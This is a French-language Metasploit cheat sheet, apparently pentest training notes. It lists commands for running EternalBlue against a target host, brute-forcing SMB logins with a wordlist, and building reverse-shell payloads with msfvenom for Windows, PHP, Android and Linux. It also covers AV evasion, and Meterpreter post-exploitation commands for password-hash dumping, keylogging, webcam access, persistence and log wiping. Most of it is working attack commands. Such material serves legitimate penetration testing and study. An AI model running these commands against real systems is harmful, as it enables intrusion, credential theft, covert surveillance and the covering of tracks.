# 09 — Using the Metasploit Framework

## Objectifs
Utiliser msfconsole efficacement : recherche, modules, options, bases de données, sessions, Meterpreter, msfvenom, post-exploitation.

---

## 1. Démarrage

```bash
sudo msfdb init          # base PostgreSQL
msfconsole -q
msfconsole -q -x "db_status; version; exit"
```

### Commandes de base
```text
help
version
db_status
search <term>
use <module>
info
show options
show advanced
show missing
set <OPTION> <value>
setg <OPTION> <value>       # global (persiste entre modules)
unset <OPTION>
run / exploit / check
back
sessions
sessions -i <ID>
background                # Ctrl+Z
```

---

## 2. Recherche & sélection

```text
search type:exploit platform:windows smb
search cve:2021-44228
search name:eternalblue
search rank:excellent
grep -h "Name:" search type:auxiliary smb
```

Rangs : `manual`, `low`, `average`, `normal`, `good`, `great`, `excellent`.

```text
use exploit/windows/smb/ms17_010_eternalblue
show targets
set target 0
show payloads
set payload windows/x64/meterpreter/reverse_tcp
set RHOSTS 10.10.10.40
set LHOST tun0
set LPORT 4444
check
run
```

### Workspaces
```text
workspace
workspace -a <CLIENT>
workspace <CLIENT>
db_nmap -sCV -p- <TARGET>
hosts
services
vulns
creds
loot
```

---

## 3. Modules auxiliaires (recon)

```text
use auxiliary/scanner/smb/smb_version
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_login
use auxiliary/scanner/ssh/ssh_login
use auxiliary/scanner/ftp/anonymous
use auxiliary/scanner/mysql/mysql_login
use auxiliary/scanner/mssql/mssql_login
use auxiliary/scanner/snmp/snmp_enum
use auxiliary/scanner/ipmi/ipmi_dumphashes
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/http_version
use auxiliary/gather/dns_enum
use auxiliary/scanner/portscan/tcp
```

```text
use auxiliary/scanner/smb/smb_login
set RHOSTS <TARGET>
set SMBUser <USER>
set PASS_FILE /usr/share/wordlists/rockyou.txt
set STOP_ON_SUCCESS true
run
```

---

## 4. Meterpreter

```text
# Navigation
pwd; ls; cd; cat file; download file; upload local remote; edit file

# Système
sysinfo
getuid
getsystem
hashdump
getprivs
ps
migrate <PID>

# Réseau / pivot
ipconfig
route
portfwd add -l 8080 -p 80 -r 10.10.10.20
autoroute -s 10.10.10.0/24

# Credentials
load kiwi
creds_all
lsa_dump_sam
lsa_dump_secrets
kerberos_ticket_list

# Écoute / capture
screenshare
screenshot
keyscan_start
keyscan_dump
webcam_list

# Persistance / évasion
run persistence -h
run post/windows/manage/migrate
clearev
timestomp
```

### Post-exploitation modules
```text
run post/windows/gather/enum_logged_on_users
run post/windows/gather/credentials/credential_collector
run post/windows/gather/enum_applications
run post/windows/manage/enable_rdp
run post/multi/recon/local_exploit_suggester
run post/linux/gather/enum_configs
run post/multi/gather/ssh_creds
```

### Sessions
```text
sessions -l
sessions -i 1
sessions -k 1
sessions -K
sessions -u 1          # upgrade shell → meterpreter
```

---

## 5. Msfvenom (rappel)

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -f exe -o met.exe
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -f raw -o shell.php
msfvenom -p android/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 R > app.apk
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -f elf -o met.elf

# Encodage
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=443 -e x86/shikata_ga_nai -i 15 -f exe -o met.exe
```

> SHA256/AV : les payloads msfvenom sont massivement signatureés. Préférer des shells custom ou des loaders en mémoire pour l'évasion.

---

## 6. Base de données & rapports

```text
db_import scan.xml
db_export -f xml report.xml
hosts -c address,os_name
services -c port,proto,name,info
creds
loot
notes
```

```bash
# Rapport
msfconsole -q -x "workspace <CLIENT>; db_export -f xml /tmp/msf.xml; exit"
```

---

## 7. Bonnes pratiques

- `check` avant `exploit` quand disponible.
- `setg RHOSTS/LHOST` pour éviter les oublis.
- `run -j` pour les handlers (session non bloquante).
- Toujours `migrate` vers un processus stable (ex. `explorer.exe`) — mais attention aux privilèges.
- Nettoyer les sessions et artefacts.
- Éviter `getsystem` aveuglément : préférer un exploit ciblé quand on veut la stabilité.

---

## Aide-mémoire des modules fréquents

| Usage | Module |
|---|---|
| SMB version | `auxiliary/scanner/smb/smb_version` |
| SMB login | `auxiliary/scanner/smb/smb_login` |
| MS17-010 | `exploit/windows/smb/ms17_010_eternalblue` |
| BlueKeep | `exploit/windows/rdp/cve_2019_0708_bluekeep_rce` |
| Tomcat manager | `exploit/multi/http/tomcat_mgr_upload` |
| Jenkins | `exploit/multi/http/jenkins_script_console` |
| WebLogic | `exploit/multi/http/weblogic_admin_handle` |
| sudo baron | `exploit/linux/local/baron_samedit` |
| Local suggester | `post/multi/recon/local_exploit_suggester` |
| Credential collector | `post/windows/gather/credentials/credential_collector` |

## Checklist
- [ ] Base de données initialisée
- [ ] Workspace créé
- [ ] Scan importé (`db_nmap` / `db_import`)
- [ ] Module + payload + options vérifiés
- [ ] `check` exécuté si possible
- [ ] Session obtenue et stabilisée
- [ ] Post-exploitation et loot exportés
